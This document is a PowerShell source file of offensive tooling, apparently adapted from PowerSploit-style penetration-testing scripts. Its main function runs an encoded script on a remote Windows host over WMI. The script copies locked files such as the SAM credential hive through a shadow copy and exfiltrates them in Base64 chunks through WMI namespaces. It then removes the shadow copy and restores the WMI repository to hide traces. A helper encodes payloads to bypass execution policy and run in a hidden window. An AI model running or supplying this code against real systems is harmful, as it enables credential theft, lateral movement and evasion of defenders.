function Invoke-WmiShadowCopy {
<#
.SYNOPSIS

Creates and links a Volume Shadow Copy, gets file handle and copies locked files, exfiltrates files over WMI. 

Author: Jesse Davis (@secabstraction)
License: BSD 3-Clause
Required Dependencies: Out-EncodedCommand, Get-WmiChunk
Optional Dependencies: New-WmiSession
 
.DESCRIPTION

Invoke-WmiShadowCopy creates a new Volume Shadow Copy via the WMI Win32_ShadowCopy class's Create method. After the Shadow Volume is created, its Device is linked to a directoy. After linking, a file handle can be acquired to copy locked files. The copied file's data is Base64 encoded and written to WMI namespaces for exfiltration.
 
.PARAMETER ComputerName 

Specifies the remote host to interact with.

.PARAMETER UserName

Specifies the Domain\UserName to create a credential object for authentication, will also accept a PSCredential object. If this parameter isn't used, the credentials of the current session will be used. (Credentials can be loaded via Runas or some other method.)

.EXAMPLE

PS C:\> Invoke-WmiShadowCopy -ComputerName Server01 -UserName Server01\Administrator -RemotePath C:\Windows\System32\config\SAM -LocalPath C:\tmp\SAM

.EXAMPLE

PS C:\> $Session1 = New-WmiSession -ComputerName Server01 -UserName Server01\Administrator -Namespace EVIL -Tag NINJATAG
PS C:\> $Session1 | Invoke-WmiShadowCopy -RemotePath C:\Windows\System32\SAM -LocalPath C:\tmp\SAM

.NOTES

TODO
----

Let me know

.LINK

http://www.secabstraction.com/

#>
Param (	
    [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
    [String]
    $ComputerName,
    
    [Parameter(ValueFromPipelineByPropertyName = $True)]
    [ValidateNotNull()]
    [System.Management.Automation.PSCredential]
    [System.Management.Automation.Credential()]
    $UserName = [System.Management.Automation.PSCredential]::Empty,
    
    [Parameter(ValueFromPipelineByPropertyName = $True)]
    [String]
    $Namespace = "root\default",
    
    [Parameter(ValueFromPipelineByPropertyName = $True)]
    [String]
    $Tag = ([System.IO.Path]::GetRandomFileName()).Remove(8,4),
    
    [Parameter(Position = 0, Mandatory = $True)]
    [ValidateNotNullOrEmpty()]
    [String]
    $RemotePath,
    
    [Parameter(Position = 1)]
    [String]
    $LocalPath = ".",

    [Parameter(Position = 2)]
    [String]
    $ShadowDirectory = ([System.IO.Path]::GetRandomFileName()).Remove(8,4)

) # End Param

    if ($PSBoundParameters['Path'] -eq '.') { $LocalPath = Resolve-Path $LocalPath }

    # PowerShell script to handle activity on remote computer
    $RemoteScript = @"

`$WmiBackup = [System.IO.Path]::GetRandomFileName()
Invoke-Expression "winmgmt /backup `$env:TEMP\`$WmiBackup"

`$NewShadowVolume = ([WMICLASS]"root\cimv2:Win32_ShadowCopy").Create("$RemotePath".SubString(0,3), "ClientAccessible")
`$ShadowDevice = (Get-WmiObject -Query "SELECT * FROM WIn32_ShadowCopy WHERE ID='`$(`$NewShadowVolume.ShadowID)'").DeviceObject + '\'
Invoke-Command {cmd.exe /c mklink /d %TEMP%\$ShadowDirectory `$ShadowDevice}

function Insert-Piece(`$i, `$piece) {
    `$Count = `$i.ToString()
	`$Zeros = "0" * (6 - `$Count.Length)
	`$Tag = "$Tag" + `$Zeros + `$Count
	`$Piece = `$Tag + `$piece + `$Tag
	`$null = Set-WmiInstance -EnableAll -Namespace $Namespace -Path __Namespace -PutType CreateOnly -Arguments @{Name=`$Piece}
}
function Insert-EncodedChunk (`$ByteBuffer) {
    `$EncodedChunk = [Convert]::ToBase64String(`$ByteBuffer)
    `$WmiEncoded = `$EncodedChunk -replace '\+',[char]0x00F3 -replace '/','_' -replace '=',''
    `$nop = [Math]::Floor(`$WmiEncoded.Length / 5500)
    if (`$WmiEncoded.Length -gt 5500) {
        `$LastPiece = `$WmiEncoded.Substring(`$WmiEncoded.Length - (`$WmiEncoded.Length % 5500), (`$WmiEncoded.Length % 5500))
        `$WmiEncoded = `$WmiEncoded.Remove(`$WmiEncoded.Length - (`$WmiEncoded.Length % 5500), (`$WmiEncoded.Length % 5500))
        for(`$i = 1; `$i -le `$nop; `$i++) { 
	        `$piece = `$WmiEncoded.Substring(0,5500)
		    `$WmiEncoded = `$WmiEncoded.Substring(5500,(`$WmiEncoded.Length - 5500))
		    Insert-Piece `$i `$piece
        }
        `$WmiEncoded = `$LastPiece
    }
    Insert-Piece (`$nop + 1) `$WmiEncoded
    Set-WmiInstance -EnableAll -Namespace $Namespace -Path __Namespace -PutType CreateOnly -Arguments @{Name='CHUNK_READY'}
}
[UInt64]`$FileOffset = 0
`$BufferSize = $BufferSize
`$Path = `$env:TEMP + '\' + "$ShadowDirectory" + "$RemotePath".SubString(2, "$RemotePath".Length - 2)
`$FileStream = New-Object System.IO.FileStream "`$Path",([System.IO.FileMode]::Open)
`$BytesLeft = `$FileStream.Length
if (`$FileStream.Length -gt `$BufferSize) {
    [Byte[]]`$ByteBuffer = New-Object Byte[] `$BufferSize
    do {
        `$FileStream.Seek(`$FileOffset, [System.IO.SeekOrigin]::Begin) | Out-Null
        `$FileStream.Read(`$ByteBuffer, 0, `$BufferSize) | Out-Null
        [UInt64]`$FileOffset += `$ByteBuffer.Length
        `$BytesLeft -= `$ByteBuffer.Length
        Insert-EncodedChunk `$ByteBuffer
        `$ChunkDownloaded = ""
        do {`$ChunkDownloaded = Get-WmiObject -Namespace $Namespace -Query "SELECT * FROM __Namespace WHERE Name like 'CHUNK_DOWNLOADED'"
        } until (`$ChunkDownloaded)
        Get-WmiObject -Namespace $Namespace -Query "SELECT * FROM __Namespace WHERE Name LIKE '$Tag%' OR Name LIKE 'CHUNK_DOWNLOADED'" | Remove-WmiObject
    } while (`$BytesLeft -gt `$BufferSize)
}
`$ByteBuffer = `$null
[Byte[]]`$ByteBuffer = New-Object Byte[] (`$BytesLeft)
`$FileStream.Seek(`$FileOffset, [System.IO.SeekOrigin]::Begin)
`$FileStream.Read(`$ByteBuffer, 0, `$BytesLeft)
Insert-EncodedChunk `$ByteBuffer
`$FileStream.Flush()
`$FileStream.Dispose()
`$FileStream = `$null
`$null = Set-WmiInstance -EnableAll -Namespace $Namespace -Path __Namespace -PutType CreateOnly -Arguments @{Name='DOWNLOAD_COMPLETE'}

Invoke-Expression "cmd.exe /c rmdir %TEMP%\$ShadowDirectory"

Get-WmiObject -Query "SELECT * FROM Win32_ShadowCopy WHERE ID='`$(`$NewShadowVolume.ShadowID)'" | Remove-WmiObject

Invoke-Expression "winmgmt.exe /restore `$env:TEMP\`$WmiBackup 1"

Remove-Item `$env:TEMP\`$WmiBackup

"@
    $ScriptBlock = [ScriptBlock]::Create($RemoteScript)

    # Base64 encode script so it can be passed as a command-line argument
    $EncodedPosh = Out-EncodedCommand -NoProfile -NonInteractive -ScriptBlock $ScriptBlock

    # Run encoded script on remote computer using WMI
    $null = Invoke-WmiMethod -EnableAllPrivileges -ComputerName $ComputerName -Credential $UserName -Class Win32_Process -Name Create -ArgumentList $EncodedPosh

    # Download chunks of data until 'DOWNLOAD_COMPLETE' flow-control flag is set
    $DownloadComplete = ""
    do {
        Get-WmiChunk -ComputerName $ComputerName -UserName $UserName -Namespace $Namespace -Tag $Tag -Path $LocalPath
        $DownloadComplete = Get-WmiObject -ComputerName $ComputerName -Credential $UserName -Namespace $Namespace `
                            -Query "SELECT * FROM __Namespace WHERE Name LIKE 'DOWNLOAD_COMPLETE'"
    } until ($DownloadComplete)

    # Remove all data written to WMI Namespace
    Get-WmiObject -ComputerName $ComputerName -Credential $UserName -Namespace $Namespace `
    -Query "SELECT * FROM __Namespace WHERE Name LIKE '$Tag%' OR Name LIKE 'DOWNLOAD_COMPLETE' or Name LIKE 'CHUNK_DOWNLOADED'" | Remove-WmiObject


}
function Get-WmiChunk {
<#
.SYNOPSIS

Retrieves chunks of data written to WMI Namespaces by Invoke-WmiShadowCopy. 

Author: Jesse Davis (@secabstraction)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None
 
.DESCRIPTION

Get-WmiChunk isn't intended for user interaction, but as a helper function for exfiltrating data over WMI.
 
.EXAMPLE

.NOTES

TODO
----

Let me know

.LINK

http://www.secabstraction.com/

#>
Param (	
    [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
    [string[]]
    $ComputerName,
    
    [Parameter(ValueFromPipelineByPropertyName = $True)]
    [ValidateNotNull()]
    [System.Management.Automation.PSCredential]
    [System.Management.Automation.Credential()]
    $UserName = [System.Management.Automation.PSCredential]::Empty,
    
    [Parameter(ValueFromPipelineByPropertyName = $True)]
    [String]
    $Namespace = "root\default",
    
    [Parameter(ValueFromPipelineByPropertyName = $True)]
    [String]
    $Tag,
    
    [Parameter(Mandatory = $True)]
    [String]$Path

) # End Param
    
    $Reconstructed = New-Object System.Text.StringBuilder

    # Wait for remote session to set flow-control flag
    $ChunkReady = ""
    do {$ChunkReady = Get-WmiObject -ComputerName $ComputerName -Credential $UserName -Namespace $Namespace `
                      -Query "SELECT * FROM __Namespace WHERE Name LIKE 'CHUNK_READY'"
    } until ($ChunkReady)

    # Remove flow-control flag
    Get-WmiObject -ComputerName $ComputerName -Credential $UserName -Namespace $Namespace `
    -Query "SELECT * FROM __Namespace WHERE Name LIKE 'CHUNK_READY'" | Remove-WmiObject
    
    # Retrieve data from WMI Namespaces, sort by tag number, store in string[]
    $GetWmiStrings = Get-WmiObject -ComputerName $ComputerName -Credential $UserName -Namespace $Namespace `
                     -Query "SELECT * FROM __Namespace WHERE Name like '$Tag%'" | % {$_.Name} | Sort-Object
    
    # Restore Base64 characters that were swapped for WMI-friendly characters and remove 14-character tags
    foreach ($line in $GetWmiStrings) {
	    $WmiToBase64 = $line.Remove(0,14) -replace [char]0x00F3,[char]0x002B -replace '_','/'
        $WmiToBase64 = $WmiToBase64.Remove($WmiToBase64.Length - 14, 14)
	    $null = $Reconstructed.Append($WmiToBase64)
    }
    
    # Restore Base64 padding characters that were removed so data can be decoded    
    if ($Reconstructed.ToString().Length % 4 -ne 0) { $null = $Reconstructed.Append(("===").Substring(0, 4 - ($Reconstructed.ToString().Length % 4))) }

    [Byte[]]$DecodedByteArray = [Convert]::FromBase64String($Reconstructed)

    # Write bytes to the local file
    $FileStream = New-Object System.IO.FileStream $Path,([System.IO.FileMode]::Append)
    $null = $FileStream.Seek(0, [System.IO.SeekOrigin]::End)
    $FileStream.Write($DecodedByteArray, 0, $DecodedByteArray.Length)
    $FileStream.Flush()
    $FileStream.Dispose()
    $FileStream = $null    
    
    # Set flow-control flag to let remote session know this chunk has been downloaded
    $null = Set-WmiInstance -ComputerName $ComputerName -Credential $UserName -Namespace $Namespace `
            -Path __Namespace -PutType CreateOnly -Arguments @{Name="CHUNK_DOWNLOADED"}
}
function Out-EncodedCommand {
<#
.SYNOPSIS

Compresses, Base-64 encodes, and generates command-line output for a PowerShell payload script.

PowerSploit Function: Out-EncodedCommand
Author: Matthew Graeber (@mattifestation)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None
 
.DESCRIPTION

Out-EncodedCommand prepares a PowerShell script such that it can be pasted into a command prompt. The scenario for using this tool is the following: You compromise a machine, have a shell and want to execute a PowerShell script as a payload. This technique eliminates the need for an interactive PowerShell 'shell' and it bypasses any PowerShell execution policies.

.PARAMETER ScriptBlock

Specifies a scriptblock containing your payload.

.PARAMETER Path

Specifies the path to your payload.

.PARAMETER NoExit

Outputs the option to not exit after running startup commands.

.PARAMETER NoProfile

Outputs the option to not load the Windows PowerShell profile.

.PARAMETER NonInteractive

Outputs the option to not present an interactive prompt to the user.

.PARAMETER Wow64

Calls the x86 (Wow64) version of PowerShell on x86_64 Windows installations.

.PARAMETER WindowStyle

Outputs the option to set the window style to Normal, Minimized, Maximized or Hidden.

.PARAMETER EncodedOutput

Base-64 encodes the entirety of the output. This is usually unnecessary and effectively doubles the size of the output. This option is only for those who are extra paranoid.

.EXAMPLE

C:\PS> Out-EncodedCommand -ScriptBlock {Write-Host 'hello, world!'}

powershell -C sal a New-Object;iex(a IO.StreamReader((a IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String('Cy/KLEnV9cgvLlFQz0jNycnXUSjPL8pJUVQHAA=='),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()

.EXAMPLE

C:\PS> Out-EncodedCommand -Path C:\EvilPayload.ps1 -NonInteractive -NoProfile -WindowStyle Hidden -EncodedOutput

powershell -NoP -NonI -W Hidden -E cwBhAGwAIABhACAATgBlAHcALQBPAGIAagBlAGMAdAA7AGkAZQB4ACgAYQAgAEkATwAuAFMAdAByAGUAYQBtAFIAZQBhAGQAZQByACgAKABhACAASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4ARABlAGYAbABhAHQAZQBTAHQAcgBlAGEAbQAoAFsASQBPAC4ATQBlAG0AbwByAHkAUwB0AHIAZQBhAG0AXQBbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACcATABjAGkAeABDAHMASQB3AEUAQQBEAFEAWAAzAEUASQBWAEkAYwBtAEwAaQA1AEsAawBGAEsARQA2AGwAQgBCAFIAWABDADgAaABLAE8ATgBwAEwAawBRAEwANAAzACsAdgBRAGgAdQBqAHkAZABBADkAMQBqAHEAcwAzAG0AaQA1AFUAWABkADAAdgBUAG4ATQBUAEMAbQBnAEgAeAA0AFIAMAA4AEoAawAyAHgAaQA5AE0ANABDAE8AdwBvADcAQQBmAEwAdQBYAHMANQA0ADEATwBLAFcATQB2ADYAaQBoADkAawBOAHcATABpAHMAUgB1AGEANABWAGEAcQBVAEkAagArAFUATwBSAHUAVQBsAGkAWgBWAGcATwAyADQAbgB6AFYAMQB3ACsAWgA2AGUAbAB5ADYAWgBsADIAdAB2AGcAPQA9ACcAKQAsAFsASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAE0AbwBkAGUAXQA6ADoARABlAGMAbwBtAHAAcgBlAHMAcwApACkALABbAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkAKQAuAFIAZQBhAGQAVABvAEUAbgBkACgAKQA=

Description
-----------
Execute the above payload for the lulz. >D

.NOTES

This cmdlet was inspired by the createcmd.ps1 script introduced during Dave Kennedy and Josh Kelley's talk, "PowerShell...OMFG" (https://www.trustedsec.com/files/PowerShell_PoC.zip)

.LINK

http://www.exploit-monday.com
#>

    [CmdletBinding( DefaultParameterSetName = 'FilePath')] Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ParameterSetName = 'ScriptBlock' )]
        [ValidateNotNullOrEmpty()]
        [ScriptBlock]
        $ScriptBlock,

        [Parameter(Position = 0, ParameterSetName = 'FilePath' )]
        [ValidateNotNullOrEmpty()]
        [String]
        $Path,

        [Switch]
        $NoExit,

        [Switch]
        $NoProfile,

        [Switch]
        $NonInteractive,

        [Switch]
        $Wow64,

        [ValidateSet('Normal', 'Minimized', 'Maximized', 'Hidden')]
        [String]
        $WindowStyle,

        [Switch]
        $EncodedOutput
    )

    if ($PSBoundParameters['Path'])
    {
        Get-ChildItem $Path -ErrorAction Stop | Out-Null
        $ScriptBytes = [IO.File]::ReadAllBytes((Resolve-Path $Path))
    }
    else
    {
        $ScriptBytes = ([Text.Encoding]::ASCII).GetBytes($ScriptBlock)
    }

    $CompressedStream = New-Object IO.MemoryStream
    $DeflateStream = New-Object IO.Compression.DeflateStream ($CompressedStream, [IO.Compression.CompressionMode]::Compress)
    $DeflateStream.Write($ScriptBytes, 0, $ScriptBytes.Length)
    $DeflateStream.Dispose()
    $CompressedScriptBytes = $CompressedStream.ToArray()
    $CompressedStream.Dispose()
    $EncodedCompressedScript = [Convert]::ToBase64String($CompressedScriptBytes)

    # Generate the code that will decompress and execute the payload.
    # This code is intentionally ugly to save space.
    $NewScript = 'sal a New-Object;iex(a IO.StreamReader((a IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String(' + "'$EncodedCompressedScript'" + '),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()'

    # Base-64 strings passed to -EncodedCommand must be unicode encoded.
    $UnicodeEncoder = New-Object System.Text.UnicodeEncoding
    $EncodedPayloadScript = [Convert]::ToBase64String($UnicodeEncoder.GetBytes($NewScript))

    # Build the command line options
    # Use the shortest possible command-line arguments to save space. Thanks @obscuresec for the idea.
    $CommandlineOptions = New-Object String[](0)
    if ($PSBoundParameters['NoExit'])
    { $CommandlineOptions += '-NoE' }
    if ($PSBoundParameters['NoProfile'])
    { $CommandlineOptions += '-NoP' }
    if ($PSBoundParameters['NonInteractive'])
    { $CommandlineOptions += '-NonI' }
    if ($PSBoundParameters['WindowStyle'])
    { $CommandlineOptions += "-W $($PSBoundParameters['WindowStyle'])" }

    $CmdMaxLength = 8190

    # Build up the full command-line string. Default to outputting a fully base-64 encoded command.
    # If the fully base-64 encoded output exceeds the cmd.exe character limit, fall back to partial
    # base-64 encoding to save space. Thanks @Carlos_Perez for the idea.
    if ($PSBoundParameters['Wow64'])
    {
        $CommandLineOutput = "$($Env:windir)\SysWOW64\WindowsPowerShell\v1.0\powershell.exe $($CommandlineOptions -join ' ') -C `"$NewScript`""

        if ($PSBoundParameters['EncodedOutput'] -or $CommandLineOutput.Length -le $CmdMaxLength)
        {
            $CommandLineOutput = "$($Env:windir)\SysWOW64\WindowsPowerShell\v1.0\powershell.exe $($CommandlineOptions -join ' ') -E `"$EncodedPayloadScript`""
        }

        if (($CommandLineOutput.Length -gt $CmdMaxLength) -and (-not $PSBoundParameters['EncodedOutput']))
        {
            $CommandLineOutput = "$($Env:windir)\SysWOW64\WindowsPowerShell\v1.0\powershell.exe $($CommandlineOptions -join ' ') -C `"$NewScript`""
        }
    }
    else
    {
        $CommandLineOutput = "powershell $($CommandlineOptions -join ' ') -C `"$NewScript`""

        if ($PSBoundParameters['EncodedOutput'] -or $CommandLineOutput.Length -le $CmdMaxLength)
        {
            $CommandLineOutput = "powershell $($CommandlineOptions -join ' ') -E `"$EncodedPayloadScript`""
        }

        if (($CommandLineOutput.Length -gt $CmdMaxLength) -and (-not $PSBoundParameters['EncodedOutput']))
        {
            $CommandLineOutput = "powershell $($CommandlineOptions -join ' ') -C `"$NewScript`""
        }
    }

    if ($CommandLineOutput.Length -gt $CmdMaxLength)
    {
            Write-Warning 'This command exceeds the cmd.exe maximum allowed length!'
    }

    Write-Output $CommandLineOutput
}
